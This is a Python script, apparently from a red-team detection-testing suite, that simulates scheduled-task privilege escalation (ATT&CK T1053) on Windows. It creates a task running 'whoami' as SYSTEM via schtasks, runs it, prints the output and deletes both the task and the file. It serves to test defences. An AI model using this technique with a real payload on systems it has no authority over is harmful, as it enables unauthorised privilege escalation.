"""
Name: Scheduled Task Privilege Escalation
RTA: schtask_escalation.py
ATT&CK: T1053
Description:
The schtask_escalation.py script simulates a privilege escalation technique by creating a scheduled task using the
`SYSTEM` account and then executing it to escalate privileges.
Key Features:
- Scheduled Task Creation: Creates a scheduled task that runs a command as the `SYSTEM` user.
- Privilege Escalation Simulation: Demonstrates how attackers can use scheduled tasks to escalate privileges on a system.
- Windows-Specific: This script relies on `schtasks.exe`, making it specific to Windows systems.
"""

import time
import os
import platform
import common


def schtasks(*args, **kwargs):
    return common.execute(['schtasks.exe'] + list(args), **kwargs)


def main():
    # Ensure script only runs on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("Scheduled Task Privilege Escalation")

    task_name = 'test-task-rta'
    file_path = os.path.abspath('task.log')
    command = "cmd.exe /c whoami.exe > " + file_path

    # Delete the task if it exists
    code, output = schtasks('/query', '/tn', task_name)
    if code == 0:
        schtasks('/delete', '/tn', task_name, '/f')

    code, output = schtasks('/create', '/tn', task_name, '/ru', 'system', '/tr', command, '/sc', 'onlogon')
    if code != 0:
        common.log("Error creating task", log_type="!")
        return

    # Run the task and grab the file
    code, output = schtasks('/run', '/tn', task_name)
    if code == 0:
        time.sleep(2)
        common.print_file(file_path)
        time.sleep(1)
        common.remove_file(file_path)

    schtasks('/delete', '/tn', task_name, '/f')


if __name__ == "__main__":
    main()
